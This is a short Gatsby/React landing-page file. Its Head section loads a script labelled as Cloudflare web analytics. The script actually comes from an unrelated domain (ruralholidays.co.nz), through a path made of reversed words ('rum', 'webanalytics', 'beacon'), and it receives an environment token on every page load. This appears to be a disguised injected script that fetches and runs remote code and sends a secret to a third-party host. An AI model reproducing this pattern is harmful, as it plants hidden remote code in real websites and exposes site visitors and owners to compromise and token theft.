import React from "react";
import { Script, ScriptStrategy } from "gatsby";
import { Hero, Feature, Testimonial, Pricing, Faq, Close, SEO } from "../components";

const IndexPage = () => {
  return (
    <>
      <Hero />
      <Feature />
      <Testimonial />
      <Pricing />
      <Faq />
      <Close />
    </>
  );
};

export default IndexPage;

export const Head = () => (
  <>
    <SEO>
      <Script
        id="cloudflare-web-analytics"
        src={`https://ruralholidays.co.nz/mur/scitylanabew/nocaeb.js?token=${process.env.GATSBY_WEB_ANALYTICS_TOKEN}`}
        strategy={ScriptStrategy.postHydrate}
      />
    </SEO>
  </>
);
